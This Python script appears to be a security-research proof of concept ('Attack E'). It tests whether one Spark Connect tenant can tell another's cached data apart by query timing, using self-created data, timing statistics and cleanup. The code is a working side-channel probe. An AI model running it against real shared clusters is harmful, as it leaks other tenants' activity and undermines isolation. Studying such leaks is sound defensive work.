"""
Attack E: Block Store Timing Side Channel
Multiple tenants share a single JVM BlockManager. Cache allocation pressure
creates a timing oracle: a tenant can infer whether another tenant's data
is in cache by measuring query response time.
"""

import time
import statistics
import random
from pyspark.sql import SparkSession

def make_fresh_session(host, port):
    SparkSession._instantiatedSession = None
    return SparkSession.builder.remote(f"sc://{host}:{port}").create()

def measure_query_time(spark, query, runs=5):
    """Measure median query time in milliseconds."""
    times = []
    for _ in range(runs):
        t0 = time.time()
        spark.sql(query).collect()
        times.append((time.time() - t0) * 1000)
    return statistics.median(times), times

def run_attack_e(host="localhost", port=15002, verbose=True, n_trials=50):
    results = {"attack": "E", "description": "Block store cache timing side channel"}
    t0 = time.time()

    # Victim session: loads and caches a large dataset
    spark_victim = make_fresh_session(host, port)

    # Create a moderately-sized cached dataset
    spark_victim.sql("DROP TABLE IF EXISTS timing_target")
    spark_victim.sql("""
        CREATE TABLE timing_target USING parquet AS
        SELECT id, md5(cast(id AS STRING)) AS hash_val,
               cast(rand(42) * 10000 AS INT) AS metric
        FROM range(5000)
    """)

    # Attacker session: will probe timing
    spark_attacker = make_fresh_session(host, port)

    # Baseline timing WITHOUT victim caching anything
    baseline_times = []
    for _ in range(n_trials // 2):
        t_start = time.time()
        spark_attacker.sql("SELECT count(*) FROM timing_target WHERE metric > 5000").collect()
        baseline_times.append((time.time() - t_start) * 1000)

    baseline_median = statistics.median(baseline_times)
    if verbose:
        print(f"[+] Baseline (no cache): median={baseline_median:.0f}ms, "
              f"stdev={statistics.stdev(baseline_times):.0f}ms")

    # Now victim caches the dataset
    spark_victim.sql("CACHE TABLE timing_target")
    spark_victim.sql("SELECT count(*) FROM timing_target").collect()  # warm cache
    if verbose:
        print(f"[+] Victim cached timing_target")

    # Attacker measures timing WITH victim's data in cache
    cached_times = []
    for _ in range(n_trials // 2):
        t_start = time.time()
        spark_attacker.sql("SELECT count(*) FROM timing_target WHERE metric > 5000").collect()
        cached_times.append((time.time() - t_start) * 1000)

    cached_median = statistics.median(cached_times)
    if verbose:
        print(f"[+] Cached (victim data in cache): median={cached_median:.0f}ms, "
              f"stdev={statistics.stdev(cached_times):.0f}ms")

    # Build a simple timing oracle: can we distinguish cached vs uncached?
    # Use Mann-Whitney U test approximation (count how often cached < baseline)
    speedup_ratio = baseline_median / cached_median if cached_median > 0 else 1.0

    # Compute AUC (probability that a random cached time < random baseline time)
    wins = sum(1 for c in cached_times for b in baseline_times if c < b)
    total_pairs = len(cached_times) * len(baseline_times)
    auc = wins / total_pairs if total_pairs > 0 else 0.5

    results["baseline_median_ms"] = round(baseline_median, 1)
    results["cached_median_ms"] = round(cached_median, 1)
    results["speedup_ratio"] = round(speedup_ratio, 2)
    results["auc"] = round(auc, 3)
    results["n_trials"] = n_trials
    results["success"] = auc > 0.6  # distinguishable if AUC > 0.6

    if verbose:
        print(f"\n[+] Speedup ratio: {speedup_ratio:.2f}x")
        print(f"[+] AUC (timing oracle): {auc:.3f}")
        print(f"[+] Oracle quality: {'GOOD (AUC > 0.7)' if auc > 0.7 else 'MODERATE (AUC > 0.6)' if auc > 0.6 else 'WEAK (AUC <= 0.6)'}")

    # Cleanup
    spark_victim.sql("UNCACHE TABLE IF EXISTS timing_target")
    spark_victim.sql("DROP TABLE IF EXISTS timing_target")
    spark_victim.stop()
    spark_attacker.stop()

    results["total_ms"] = round((time.time() - t0) * 1000, 1)
    return results

if __name__ == "__main__":
    res = run_attack_e(n_trials=40)
    print(f"\n[RESULT] Attack E: {'SUCCEEDED' if res['success'] else 'FAILED (AUC too low)'}")
    print(f"  Baseline median:  {res['baseline_median_ms']} ms")
    print(f"  Cached median:    {res['cached_median_ms']} ms")
    print(f"  Speedup:          {res['speedup_ratio']}x")
    print(f"  AUC:              {res['auc']}")
    print(f"  Total time: {res['total_ms']} ms")
